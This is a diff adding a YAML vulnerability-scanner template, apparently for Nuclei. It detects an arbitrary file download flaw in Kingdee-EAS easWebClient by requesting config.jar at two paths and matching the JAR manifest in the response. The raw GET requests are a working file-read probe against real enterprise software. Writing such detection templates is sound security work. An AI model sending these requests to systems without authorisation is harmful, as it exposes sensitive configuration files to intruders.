@@ -1,0 +1,42 @@
+id: kingdee-eas-arbitrary-file-download
+info:
+  name: Kingdee-EAS easWebClient Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kingdee-EAS easWebClient contains an arbitrary file download vulnerability allowing attackers to read sensitive configuration files, such as config.jar.
+  reference:
+    - http://www.kingdee.com/
+  classification:
+    cvss-score: 7.5
+  metadata:
+    product: Kingdee-EAS
+    tags: file-read
+http:
+  - raw:
+      - |
+        GET /easWebClient/bin/config.jar HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "META-INF/MANIFEST.MF"
+
+  - raw:
+      - |
+        GET /easWebClient/bin/lib/config.jar HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "META-INF/MANIFEST.MF"
